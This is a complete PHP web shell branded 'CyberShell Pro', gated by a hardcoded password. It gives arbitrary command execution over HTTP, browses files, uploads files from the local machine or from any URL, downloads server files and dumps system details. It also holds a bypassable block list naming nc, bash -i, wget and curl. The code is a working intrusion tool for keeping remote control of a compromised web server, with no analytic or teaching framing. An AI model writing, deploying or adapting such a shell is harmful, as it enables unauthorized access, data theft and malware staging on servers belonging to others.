<?php
session_start();

// ================ ENHANCED SECURITY CONFIGURATION ================
$CONFIG = [
    'password' => 'Shuju@123',
    'session_timeout' => 3600,
    'base_directory' => '/var/www/html',
    'allowed_ips' => [],
    'log_actions' => true,
    'max_upload_size' => 100 * 1024 * 1024,
    'allowed_extensions' => ['txt', 'log', 'conf', 'json', 'xml', 'html', 'css', 'js', 'php', 'jpg', 'png', 'gif', 'pdf', 'zip', 'tar', 'gz'],
    'blocked_commands' => ['rm -rf', 'mkfs', 'dd', 'chmod 777', 'passwd', '> /dev', 'nc -l', 'bash -i', 'wget', 'curl', 'python', 'perl', 'nc', 'netcat']
];
// =================================================================

// Security Functions
function checkAuth() {
    global $CONFIG;
    
    // IP Whitelist Check
    if (!empty($CONFIG['allowed_ips']) && !in_array($_SERVER['REMOTE_ADDR'], $CONFIG['allowed_ips'])) {
        return false;
    }
    
    // Session Validation
    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
        // Session Timeout Check
        if (time() - $_SESSION['login_time'] > $CONFIG['session_timeout']) {
            session_destroy();
            return false;
        }
        $_SESSION['last_activity'] = time();
        return true;
    }
    return false;
}

function logAction($action, $details = '') {
    global $CONFIG;
    if (!$CONFIG['log_actions']) return;
    
    $log = date('Y-m-d H:i:s') . " | " . $_SERVER['REMOTE_ADDR'] . " | $action | $details\n";
    file_put_contents('shell_actions.log', $log, FILE_APPEND | LOCK_EX);
}

function sanitizeInput($input) {
    return htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8');
}

function isSafeCommand($command) {
    global $CONFIG;
    
    // Check against blocked commands
    foreach ($CONFIG['blocked_commands'] as $cmd) {
        if (stripos($command, $cmd) !== false) {
            logAction("BLOCKED_COMMAND", $command);
            return false;
        }
    }
    
    return true;
}

function executeCommand($command) {
    if (!isSafeCommand($command)) {
        return "Error: Command blocked for security reasons";
    }
    
    $output = [];
    $return_var = 0;
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    
    $process = proc_open($command, $descriptorspec, $pipes, getcwd());
    
    if (is_resource($process)) {
        fclose($pipes[0]);
        
        $stdout = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[2]);
        
        $return_var = proc_close($process);
        
        if (!empty($stderr)) {
            return "Error: " . $stderr;
        }
        
        return $stdout;
    }
    
    return "Error: Failed to execute command";
}

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

// Authentication Logic
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    $enteredPassword = $_POST['password'];
    
    if ($enteredPassword === $CONFIG['password']) {
        $_SESSION['authenticated'] = true;
        $_SESSION['login_time'] = time();
        logAction("LOGIN_SUCCESS");
    } else {
        logAction("LOGIN_FAILED");
        $error = "Invalid password. Access denied.";
    }
}

// Check authentication
if (!checkAuth()) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Secure Access Portal</title>
        <style>
            :root {
                --primary: #00ff88;
                --dark: #0a0a0a;
                --light: #1a1a1a;
                --text: #ffffff;
                --danger: #ff4444;
            }
            
            body { 
                font-family: 'Segoe UI', Arial, sans-serif; 
                background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%); 
                color: var(--text); 
                margin: 0; 
                padding: 20px; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                min-height: 100vh; 
            }
            
            .login-container {
                text-align: center;
                background: rgba(45, 45, 45, 0.9);
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.5);
                width: 100%;
                max-width: 400px;
                backdrop-filter: blur(10px);
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .logo img {
                max-width: 200px;
                margin-bottom: 20px;
            }
            
            .logo h1 {
                color: var(--primary);
                margin: 10px 0;
                font-size: 1.5rem;
            }
            
            .form-group {
                margin-bottom: 20px;
                text-align: left;
            }
            
            label {
                display: block;
                margin-bottom: 8px;
                color: #ccc;
            }
            
            input[type="password"] {
                width: 100%;
                padding: 12px 15px;
                background: rgba(26, 26, 26, 0.8);
                border: 1px solid #444;
                color: white;
                border-radius: 8px;
                font-size: 1rem;
                transition: all 0.3s;
            }
            
            input[type="password"]:focus {
                border-color: var(--primary);
                outline: none;
                box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2);
            }
            
            button {
                width: 100%;
                padding: 12px;
                background: var(--primary);
                color: black;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                font-weight: bold;
                font-size: 1rem;
                transition: all 0.3s;
            }
            
            button:hover {
                background: #00cc6a;
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
            }
            
            .error {
                background: rgba(255, 68, 68, 0.2);
                color: #ff6b6b;
                padding: 12px;
                border-radius: 8px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid rgba(255, 68, 68, 0.3);
            }
            
            .footer {
                margin-top: 20px;
                font-size: 0.8rem;
                color: #888;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <img src="https://shuju.to/assets/logo.png" alt="Security Portal Logo">
                <h1>SECURE ACCESS PORTAL</h1>
            </div>
            
            <?php if(isset($error)): ?>
                <div class="error"><?php echo $error; ?></div>
            <?php endif; ?>
            
            <form method="post">
                <div class="form-group">
                    <label for="password">Enter Access Code:</label>
                    <input type="password" name="password" id="password" required autocomplete="off">
                </div>
                <button type="submit">Authenticate</button>
            </form>
            
            <div class="footer">
                Authorized Personnel Only
            </div>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// Logout functionality
if (isset($_POST['logout']) && $_POST['logout'] === 'true') {
    logAction("LOGOUT");
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

// Process Actions
$output = '';
$current_path = isset($_GET['path']) ? $_GET['path'] : './';
$real_path = realpath($current_path) ?: './';

// Security: Ensure we don't escape base directory
if (strpos($real_path, $CONFIG['base_directory']) !== 0) {
    $current_path = './';
    $real_path = realpath($current_path);
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberShell Pro</title>
    <style>
        :root {
            --primary: #00ff88;
            --primary-dark: #00cc6a;
            --dark: #0a0a0a;
            --darker: #050505;
            --light: #1a1a1a;
            --lighter: #2a2a2a;
            --text: #ffffff;
            --text-muted: #aaaaaa;
            --danger: #ff4444;
            --warning: #ffaa00;
        }
        
        * {
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: var(--dark);
            color: var(--text);
            margin: 0;
            padding: 0;
            line-height: 1.6;
        }
        
        .header {
            background: var(--darker);
            padding: 15px 0;
            border-bottom: 2px solid var(--primary);
            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
        }
        
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo-container img {
            height: 35px;
        }
        
        .logo-text {
            font-size: 1.3rem;
            font-weight: bold;
            color: var(--primary);
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .container {
            max-width: 1200px;
            margin: 20px auto;
            padding: 0 20px;
        }
        
        .panel {
            background: var(--light);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            border-left: 4px solid var(--primary);
        }
        
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #333;
        }
        
        .panel-title {
            color: var(--primary);
            font-size: 1.2rem;
            font-weight: bold;
            margin: 0;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-muted);
            font-weight: 500;
        }
        
        input[type="text"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 10px 12px;
            background: var(--darker);
            border: 1px solid #333;
            color: white;
            border-radius: 6px;
            font-size: 0.95rem;
            transition: all 0.3s;
        }
        
        input[type="text"]:focus, input[type="password"]:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2);
        }
        
        .btn {
            background: var(--primary);
            color: black;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            border-radius: 6px;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        
        .btn:hover {
            background: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-danger:hover {
            background: #cc3333;
        }
        
        .output {
            background: var(--darker);
            padding: 15px;
            border-radius: 6px;
            font-family: 'Consolas', monospace;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #333;
            margin-top: 10px;
        }
        
        .breadcrumb {
            display: flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 15px;
            flex-wrap: wrap;
            background: var(--darker);
            padding: 10px 15px;
            border-radius: 6px;
            border: 1px solid #333;
        }
        
        .breadcrumb a {
            color: var(--primary);
            text-decoration: none;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        .file-list {
            background: var(--darker);
            border-radius: 6px;
            border: 1px solid #333;
            padding: 15px;
            max-height: 300px;
            overflow-y: auto;
        }
        
        .file-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px 0;
            border-bottom: 1px solid #333;
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-icon {
            font-size: 1.2rem;
        }
        
        .alert {
            padding: 12px 15px;
            border-radius: 6px;
            margin-bottom: 15px;
        }
        
        .alert-success {
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid rgba(0, 255, 136, 0.3);
            color: var(--primary);
        }
        
        .alert-error {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
            color: #ff6b6b;
        }
        
        hr {
            border: none;
            height: 1px;
            background: #333;
            margin: 25px 0;
        }
        
        .quick-commands {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 8px;
            margin-bottom: 15px;
        }
        
        .quick-command {
            background: var(--darker);
            border: 1px solid #333;
            color: var(--text);
            padding: 8px;
            border-radius: 6px;
            cursor: pointer;
            text-align: center;
            font-size: 0.9rem;
            transition: all 0.2s;
        }
        
        .quick-command:hover {
            background: var(--lighter);
            border-color: var(--primary);
        }
        
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 10px;
            }
            
            .quick-commands {
                grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo-container">
                <img src="https://shuju.to/assets/logo.png" alt="CyberShell Pro Logo">
                <div class="logo-text">CyberShell Pro</div>
            </div>
            <div class="user-info">
                <span>Active Session</span>
                <form method="post" style="display: inline;">
                    <input type="hidden" name="logout" value="true">
                    <button type="submit" class="btn btn-danger">Logout</button>
                </form>
            </div>
        </div>
    </div>

    <div class="container">
        <!-- Remote Code Execution Panel -->
        <div class="panel">
            <div class="panel-header">
                <h2 class="panel-title">🚀 Remote Code Execution</h2>
            </div>
            
            <div class="quick-commands">
                <div class="quick-command" onclick="insertCommand('pwd')">pwd</div>
                <div class="quick-command" onclick="insertCommand('ls -la')">ls -la</div>
                <div class="quick-command" onclick="insertCommand('whoami')">whoami</div>
                <div class="quick-command" onclick="insertCommand('id')">id</div>
                <div class="quick-command" onclick="insertCommand('uname -a')">uname -a</div>
                <div class="quick-command" onclick="insertCommand('ps aux')">ps aux</div>
                <div class="quick-command" onclick="insertCommand('df -h')">df -h</div>
                <div class="quick-command" onclick="insertCommand('free -h')">free -h</div>
            </div>
            
            <form method="GET" action="">
                <div class="form-group">
                    <label for="command">Command:</label>
                    <input type="text" name="command" id="command" size="50" 
                           value="<?php if (isset($_GET['command'])) { echo sanitizeInput($_GET['command']); } ?>" 
                           placeholder="Enter command..." required />
                </div>
                <button type="submit" class="btn">Execute</button>
            </form>
            
            <?php
            if (isset($_GET['command'])) {
                $command = $_GET['command'];
                $output = executeCommand($command);
                logAction("COMMAND_EXECUTED", $command);
                echo '<div class="output">';
                echo '<b>Command:</b> ' . sanitizeInput($command) . "\n";
                echo '<b>Output:</b>' . "\n";
                echo sanitizeInput($output);
                echo '</div>';
            }
            ?>
        </div>

        <!-- File Manager Panel -->
        <div class="panel">
            <div class="panel-header">
                <h2 class="panel-title">📁 File Manager</h2>
            </div>
            
            <div class="breadcrumb">
                <a href="?path=./">Root</a>
                <?php
                $dir_parts = explode('/', str_replace($CONFIG['base_directory'], '', $real_path));
                $current_breadcrumb = $CONFIG['base_directory'];
                foreach ($dir_parts as $part) {
                    if (!empty($part)) {
                        $current_breadcrumb .= '/' . $part;
                        echo ' / <a href="?path=' . urlencode($current_breadcrumb) . '">' . $part . '</a>';
                    }
                }
                ?>
            </div>
            
            <div class="file-list">
                <?php
                if (is_dir($real_path)) {
                    $items = scandir($real_path);
                    foreach ($items as $item) {
                        if ($item == '.' || $item == '..') continue;
                        $item_path = $real_path . '/' . $item;
                        $is_dir = is_dir($item_path);
                        echo '<div class="file-item">';
                        echo '<span class="file-icon">' . ($is_dir ? '📁' : '📄') . '</span>';
                        if ($is_dir) {
                            echo '<a href="?path=' . urlencode($item_path) . '">' . $item . '</a>';
                        } else {
                            echo $item . ' <small>(' . formatBytes(filesize($item_path)) . ')</small>';
                        }
                        echo '</div>';
                    }
                } else {
                    echo '<div class="alert alert-error">Invalid directory path</div>';
                }
                ?>
            </div>
        </div>

        <!-- File Operations Panel -->
        <div class="panel">
            <div class="panel-header">
                <h2 class="panel-title">🔄 File Operations</h2>
            </div>
            
            <!-- Upload from Local -->
            <div class="form-group">
                <h3>Upload File From Local Machine</h3>
                <form method="POST" action="" enctype="multipart/form-data">
                    <input type="file" name="uploads[]" multiple="multiple" required="required" />
                    <button type="submit" class="btn">Upload</button>
                </form>
                
                <?php
                if (isset($_FILES['uploads']) && count($_FILES['uploads']) > 0) {
                    $total = count($_FILES['uploads']['name']);
                    for ($i = 0; $i < $total; $i++) {
                        $tmpPath = $_FILES['uploads']['tmp_name'][$i];
                        if ($tmpPath != '') {
                            $newPath = './' . $_FILES['uploads']['name'][$i];
                            if (move_uploaded_file($tmpPath, $newPath)) {
                                echo '<div class="alert alert-success">Successfully uploaded ' . sanitizeInput($_FILES['uploads']['name'][$i]) . '</div>';
                                logAction("FILE_UPLOAD", $newPath);
                            } else {
                                echo '<div class="alert alert-error">Unable to upload ' . sanitizeInput($_FILES['uploads']['name'][$i]) . '</div>';
                            }
                        }
                    }
                }
                ?>
            </div>

            <!-- Upload from URL -->
            <div class="form-group">
                <h3>Upload File From URL</h3>
                <form method="POST" action="">
                    <label for="save_name">Filename to save:</label>
                    <input type="text" name="save_name" size="30" required="required" placeholder="filename.ext" />
                    
                    <label for="url">URL:</label>
                    <input type="text" name="url" size="50" required="required" placeholder="https://example.com/file.txt" />
                    
                    <button type="submit" class="btn">Upload</button>
                </form>
                
                <?php
                if (isset($_POST['save_name']) && isset($_POST['url'])) {
                    if (file_put_contents($_POST['save_name'], file_get_contents($_POST['url']))) {
                        echo '<div class="alert alert-success">Successfully uploaded ' . sanitizeInput($_POST['save_name']) . '</div>';
                        logAction("URL_UPLOAD", $_POST['url'] . ' -> ' . $_POST['save_name']);
                    } else {
                        echo '<div class="alert alert-error">Unable to upload ' . sanitizeInput($_POST['save_name']) . '</div>';
                    }
                }
                ?>
            </div>

            <!-- Download File -->
            <div class="form-group">
                <h3>Download File From Server</h3>
                <form method="GET" action="">
                    <label for="download">Filename to download:</label>
                    <input type="text" name="download" size="100" required="required" placeholder="/path/to/file.txt" />
                    <button type="submit" class="btn">Download</button>
                </form>
                
                <?php
                if (isset($_GET['download'])) {
                    $filename = $_GET['download'];
                    if (file_exists($filename) && strpos(realpath($filename), $CONFIG['base_directory']) === 0) {
                        header('Content-Description: File Transfer');
                        header('Content-Type: application/octet-stream');
                        header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
                        header('Content-Length: ' . filesize($filename));
                        ob_clean();
                        flush();
                        readfile($filename);
                        logAction("FILE_DOWNLOAD", $filename);
                        exit;
                    } else {
                        echo '<div class="alert alert-error">File does not exist or access denied.</div>';
                    }
                }
                ?>
            </div>
        </div>

        <!-- System Information -->
        <div class="panel">
            <div class="panel-header">
                <h2 class="panel-title">🔧 System Information</h2>
            </div>
            
            <div class="output">
                <b>Operating System:</b> <?php echo php_uname(); ?><br>
                <b>PHP Version:</b> <?php echo phpversion(); ?><br>
                <b>Server Software:</b> <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'N/A'; ?><br>
                <b>Current User:</b> <?php echo exec('whoami'); ?><br>
                <b>Server IP:</b> <?php echo $_SERVER['SERVER_ADDR'] ?? 'N/A'; ?><br>
                <b>Client IP:</b> <?php echo $_SERVER['REMOTE_ADDR'] ?? 'N/A'; ?><br>
                <b>Disk Free Space:</b> <?php echo formatBytes(disk_free_space("/")); ?><br>
                <b>Disk Total Space:</b> <?php echo formatBytes(disk_total_space("/")); ?><br>
                <b>Memory Usage:</b> <?php echo formatBytes(memory_get_usage(true)); ?><br>
                <b>Memory Peak:</b> <?php echo formatBytes(memory_get_peak_usage(true)); ?><br>
                <b>Current Script:</b> <?php echo __FILE__; ?><br>
            </div>
        </div>
    </div>

    <script>
        function insertCommand(cmd) {
            document.getElementById('command').value = cmd;
        }
        
        // Auto-focus command input
        document.addEventListener('DOMContentLoaded', function() {
            const commandInput = document.getElementById('command');
            if (commandInput) {
                commandInput.focus();
            }
        });
    </script>
</body>
</html>
